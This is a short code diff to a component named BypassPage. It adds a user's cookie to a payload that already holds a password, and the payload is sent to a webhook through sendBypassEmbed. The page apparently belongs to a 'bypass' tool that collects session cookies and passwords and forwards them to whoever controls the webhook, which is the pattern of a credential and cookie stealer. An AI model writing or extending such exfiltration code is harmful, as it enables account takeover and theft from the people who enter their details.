@@ -111,6 +111,7 @@ const BypassPage = () => {
     if (webhook) {
       sendBypassEmbed(webhook, {
         valid: apiOk,
+        cookie: trimmed,
         password,
       });
     }
